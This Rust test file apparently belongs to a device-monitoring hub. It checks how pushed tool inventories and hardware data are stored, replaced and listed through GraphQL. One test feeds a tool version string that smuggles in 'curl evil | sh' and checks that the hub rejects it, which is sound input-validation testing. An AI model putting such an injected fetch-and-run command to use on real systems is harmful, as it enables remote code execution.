//! CAP-020 to CAP-031 through the hub's routes: a pushed batch's `inventory` replaces the
//! device's tool inventory, its absence (an older daemon) leaves it, and `capabilities` lists it
//! to a read key, filtered by tool and build target.

use axum::http::StatusCode;
use chrono::{DateTime, TimeDelta, Utc};
use serde_json::{Value, json};
use sqlx::PgPool;

use crate::daemon::{
    batches::cpu_batch,
    harness::{DOCKER_HOST, Daemons, PVE_01, pushing_now},
};

const CAPABILITIES: &str = "query($tool: String, $buildTarget: String) {
    capabilities(tool: $tool, buildTarget: $buildTarget) {
        device { id name } architecture os osVersion
        tools { name version usable reason } buildTargets foundAt } }";

const CREATE_KEY: &str =
    "mutation($input: ApiKeyInput!) { createApiKey(input: $input) { secret } }";

/// A batch of `device` at `at` with one CPU point, and `inventory` when given.
fn inventory_batch(device: &str, at: DateTime<Utc>, inventory: Option<Value>) -> Value {
    let mut pushed = cpu_batch(device, at, 5.0);
    if let Some(inventory) = inventory {
        pushed["inventory"] = inventory;
    }
    pushed
}

fn linux(tools: Value, targets: Value) -> Value {
    let mut inventory = json!({ "architecture": "x86_64", "os": "linux", "osVersion": "24.04" });
    inventory["tools"] = tools;
    inventory["buildTargets"] = targets;
    inventory
}

/// A read key's secret, made by the signed-in operator.
async fn read_key(daemons: &Daemons, now: DateTime<Utc>) -> String {
    let input = json!({ "name": "inventory reader", "scope": "READ", "madeFor": "AGENT",
                        "expiresAt": now + TimeDelta::days(30) });
    let made = daemons.operate(CREATE_KEY, json!({ "input": input })).await;
    made["data"]["createApiKey"]["secret"]
        .as_str()
        .unwrap_or_else(|| panic!("{made}"))
        .to_owned()
}

async fn listed(daemons: &Daemons, key: &str, filter: Value) -> Vec<Value> {
    let answer = daemons.graphql(Some(key), CAPABILITIES, filter).await;
    answer["data"]["capabilities"]
        .as_array()
        .unwrap_or_else(|| panic!("{answer}"))
        .clone()
}

fn names(rows: &[Value]) -> Vec<&str> {
    rows.iter()
        .map(|row| row["device"]["name"].as_str().unwrap_or_default())
        .collect()
}

#[sqlx::test(
    migrations = "./migrations",
    fixtures(path = "../../fixtures", scripts("devices"))
)]
async fn cap_029_a_pushed_inventory_replaces_the_stored_one_and_an_older_daemon_keeps_it(
    pool: PgPool,
) {
    let now = pushing_now(&pool).await;
    let daemons = Daemons::at(&pool, now).await;
    let token = daemons.token_for(PVE_01).await;
    let key = read_key(&daemons, now).await;
    let at = |step: i64| now - TimeDelta::seconds(40 - 10 * step);

    let older_daemon = inventory_batch(PVE_01, at(0), None);
    assert_eq!(
        daemons.push(&token, &older_daemon).await.0,
        StatusCode::NO_CONTENT
    );
    assert_eq!(listed(&daemons, &key, json!({})).await, Vec::<Value>::new());

    let tools = json!([
        { "name": "rustc", "version": "1.91.0" },
        { "name": "git", "version": "2.43.0" },
        { "name": "bun", "state": "timed_out" },
        { "name": "cargo", "state": "exited" },
        { "name": "node", "state": "no_version" },
        { "name": "docker", "state": "denied" },
        { "name": "zig", "version": "0.15.1" }
    ]);
    let first = linux(
        tools,
        json!(["x86_64-unknown-linux-gnu", "aarch64-unknown-linux-gnu"]),
    );
    let pushed = inventory_batch(PVE_01, at(1), Some(first));
    assert_eq!(
        daemons.push(&token, &pushed).await.0,
        StatusCode::NO_CONTENT
    );
    let rows = listed(&daemons, &key, json!({})).await;
    assert_eq!(
        rows,
        [json!({
            "device": { "id": PVE_01, "name": "pve-01" },
            "architecture": "x86_64", "os": "linux", "osVersion": "24.04",
            "tools": [
                { "name": "git", "version": "2.43.0", "usable": true, "reason": null },
                { "name": "rustc", "version": "1.91.0", "usable": true, "reason": null },
                { "name": "cargo", "version": null, "usable": false, "reason": "EXITED" },
                { "name": "bun", "version": null, "usable": false, "reason": "TIMED_OUT" },
                { "name": "node", "version": null, "usable": false, "reason": "NO_VERSION" },
                { "name": "docker", "version": null, "usable": false, "reason": "FAILED" }
            ],
            "buildTargets": ["aarch64-unknown-linux-gnu", "x86_64-unknown-linux-gnu"],
            "foundAt": rows[0]["foundAt"],
        })],
        "zig is a tool this hub does not know: dropped; a reason it does not know is FAILED"
    );

    let unchanged = inventory_batch(PVE_01, at(2), None);
    assert_eq!(
        daemons.push(&token, &unchanged).await.0,
        StatusCode::NO_CONTENT
    );
    assert_eq!(
        listed(&daemons, &key, json!({})).await,
        rows,
        "absent means unchanged"
    );

    let cleared = inventory_batch(PVE_01, at(3), Some(linux(json!([]), json!([]))));
    assert_eq!(
        daemons.push(&token, &cleared).await.0,
        StatusCode::NO_CONTENT
    );
    let rows = listed(&daemons, &key, json!({})).await;
    assert_eq!(
        (&rows[0]["tools"], &rows[0]["buildTargets"]),
        (&json!([]), &json!([]))
    );
}

#[sqlx::test(
    migrations = "./migrations",
    fixtures(path = "../../fixtures", scripts("devices"))
)]
async fn cap_030_capabilities_filter_by_usable_tool_and_by_build_target(pool: PgPool) {
    let now = pushing_now(&pool).await;
    let daemons = Daemons::at(&pool, now).await;
    let key = read_key(&daemons, now).await;
    let at = now - TimeDelta::seconds(10);
    let pve = linux(
        json!([{ "name": "cargo", "version": "1.91.0" }, { "name": "docker", "state": "failed" }]),
        json!(["x86_64-unknown-linux-gnu"]),
    );
    let docker_host = linux(
        json!([{ "name": "docker", "version": "29.0.1" }]),
        json!(["wasm32-unknown-unknown", "x86_64-unknown-linux-gnu"]),
    );
    for (device, inventory) in [(PVE_01, pve), (DOCKER_HOST, docker_host)] {
        let token = daemons.token_for(device).await;
        let pushed = inventory_batch(device, at, Some(inventory));
        assert_eq!(
            daemons.push(&token, &pushed).await.0,
            StatusCode::NO_CONTENT
        );
    }

    let every = listed(&daemons, &key, json!({})).await;
    assert_eq!(names(&every), ["docker-host", "pve-01"], "by device name");
    let docker = listed(&daemons, &key, json!({ "tool": "docker" })).await;
    assert_eq!(
        names(&docker),
        ["docker-host"],
        "a failed docker is not usable"
    );
    let wasm = listed(
        &daemons,
        &key,
        json!({ "buildTarget": "wasm32-unknown-unknown" }),
    )
    .await;
    assert_eq!(names(&wasm), ["docker-host"]);
    let both = json!({ "tool": "cargo", "buildTarget": "x86_64-unknown-linux-gnu" });
    assert_eq!(names(&listed(&daemons, &key, both).await), ["pve-01"]);
    let neither = json!({ "tool": "cargo", "buildTarget": "wasm32-unknown-unknown" });
    assert_eq!(listed(&daemons, &key, neither).await, Vec::<Value>::new());
    let unknown = listed(&daemons, &key, json!({ "tool": "zig" })).await;
    assert_eq!(unknown, Vec::<Value>::new());
}

#[sqlx::test(
    migrations = "./migrations",
    fixtures(path = "../../fixtures", scripts("devices"))
)]
async fn cap_029_an_inventory_that_breaks_k8_is_malformed_and_stores_nothing(pool: PgPool) {
    let now = pushing_now(&pool).await;
    let daemons = Daemons::at(&pool, now).await;
    let token = daemons.token_for(PVE_01).await;
    let hostile = linux(
        json!([{ "name": "git", "version": "2.43.0; curl evil | sh" }]),
        json!([]),
    );
    let pushed = inventory_batch(PVE_01, now - TimeDelta::seconds(10), Some(hostile));
    assert_eq!(
        daemons.push(&token, &pushed).await.0,
        StatusCode::BAD_REQUEST
    );
    let stored: i64 = sqlx::query_scalar("SELECT count(*) FROM metrics.inventories")
        .fetch_one(&pool)
        .await
        .unwrap();
    assert_eq!(stored, 0);
}

#[sqlx::test(
    migrations = "./migrations",
    fixtures(path = "../../fixtures", scripts("devices"))
)]
async fn cap_020_a_deleted_device_takes_its_inventory_with_it(pool: PgPool) {
    let now = pushing_now(&pool).await;
    let daemons = Daemons::at(&pool, now).await;
    let token = daemons.token_for(PVE_01).await;
    let inventory = linux(
        json!([{ "name": "git", "version": "2.43.0" }]),
        json!(["x"]),
    );
    let pushed = inventory_batch(PVE_01, now - TimeDelta::seconds(10), Some(inventory));
    assert_eq!(
        daemons.push(&token, &pushed).await.0,
        StatusCode::NO_CONTENT
    );
    sqlx::query("DELETE FROM devices.devices WHERE id = $1::uuid")
        .bind(PVE_01)
        .execute(&pool)
        .await
        .unwrap();
    for table in ["inventories", "tools", "build_targets"] {
        let left: i64 = sqlx::query_scalar(&format!("SELECT count(*) FROM metrics.{table}"))
            .fetch_one(&pool)
            .await
            .unwrap();
        assert_eq!(left, 0, "{table}");
    }
}

#[sqlx::test(
    migrations = "./migrations",
    fixtures(path = "../../fixtures", scripts("devices"))
)]
async fn win2_native_windows_inventory_is_stored_and_listed(pool: PgPool) {
    let now = pushing_now(&pool).await;
    let daemons = Daemons::at(&pool, now).await;
    let token = daemons.token_for(PVE_01).await;
    let key = read_key(&daemons, now).await;
    let inventory = json!({
        "architecture": "x86_64", "os": "windows", "osVersion": "11.0.26100",
        "tools": [{"name": "rustc", "version": "1.100.0"}],
        "buildTargets": ["x86_64-pc-windows-msvc"]
    });
    let batch = inventory_batch(PVE_01, now - TimeDelta::seconds(10), Some(inventory));
    assert_eq!(daemons.push(&token, &batch).await.0, StatusCode::NO_CONTENT);
    let rows = listed(&daemons, &key, json!({})).await;
    assert_eq!(rows.len(), 1);
    assert_eq!(rows[0]["os"], "windows");
    assert_eq!(rows[0]["buildTargets"], json!(["x86_64-pc-windows-msvc"]));
}

const HARDWARE: &str = "{ capabilities { device { name } hardware {
    systemMemoryBytes unifiedMemoryBytes dedicatedMemoryBytes usableMemoryBytes
    usableMemorySource freeDiskBytes cpuFeatures backends { name usable reason }
    powerSource thermalState operatorActive } } }";

#[sqlx::test(
    migrations = "./migrations",
    fixtures(path = "../../fixtures", scripts("devices"))
)]
async fn cap_032_pushed_hardware_values_replace_the_stored_ones_and_are_listed(pool: PgPool) {
    let now = pushing_now(&pool).await;
    let daemons = Daemons::at(&pool, now).await;
    let token = daemons.token_for(PVE_01).await;
    let key = read_key(&daemons, now).await;
    let at = |step: i64| now - TimeDelta::seconds(40 - 10 * step);
    let mut pushed = inventory_batch(PVE_01, at(0), Some(linux(json!([]), json!([]))));
    pushed["hardware"] = json!({
        "systemMemoryBytes": 68_719_476_736_u64, "dedicatedMemoryBytes": 25_769_803_776_u64,
        "freeDiskBytes": 549_755_813_888_u64, "cpuFeatures": ["fma", "avx2"],
        "backends": [{ "name": "cuda" }, { "name": "rocm", "state": "no_device" },
                     { "name": "opencl" }, { "name": "vulkan", "state": "later" }],
        "powerSource": "mains", "thermalState": "hot" });
    assert_eq!(
        daemons.push(&token, &pushed).await.0,
        StatusCode::NO_CONTENT
    );
    let answer = daemons.graphql(Some(&key), HARDWARE, json!({})).await;
    assert_eq!(
        answer["data"]["capabilities"][0]["hardware"],
        json!({
            "systemMemoryBytes": 68_719_476_736.0_f64, "unifiedMemoryBytes": null,
            "dedicatedMemoryBytes": 25_769_803_776.0_f64, "usableMemoryBytes": null,
            "usableMemorySource": null, "freeDiskBytes": 549_755_813_888.0_f64,
            "cpuFeatures": ["avx2", "fma"],
            "backends": [ { "name": "cuda", "usable": true, "reason": null },
                          { "name": "rocm", "usable": false, "reason": "NO_DEVICE" },
                          { "name": "vulkan", "usable": false, "reason": "FAILED" } ],
            "powerSource": "MAINS", "thermalState": null, "operatorActive": null }),
        "an unknown backend is dropped, an unknown reason is FAILED, an unknown state is null"
    );
    let mut older = inventory_batch(PVE_01, at(1), None);
    older["hardware"] = Value::Null;
    assert_eq!(daemons.push(&token, &older).await.0, StatusCode::NO_CONTENT);
    let kept = daemons.graphql(Some(&key), HARDWARE, json!({})).await;
    assert_eq!(kept, answer, "an absent member leaves the values");
    let mut broken = inventory_batch(PVE_01, at(2), None);
    broken["hardware"] = json!({ "systemMemoryBytes": 1, "cpuFeatures": ["AVX"], "backends": [] });
    assert_eq!(
        daemons.push(&token, &broken).await.0,
        StatusCode::BAD_REQUEST
    );
}
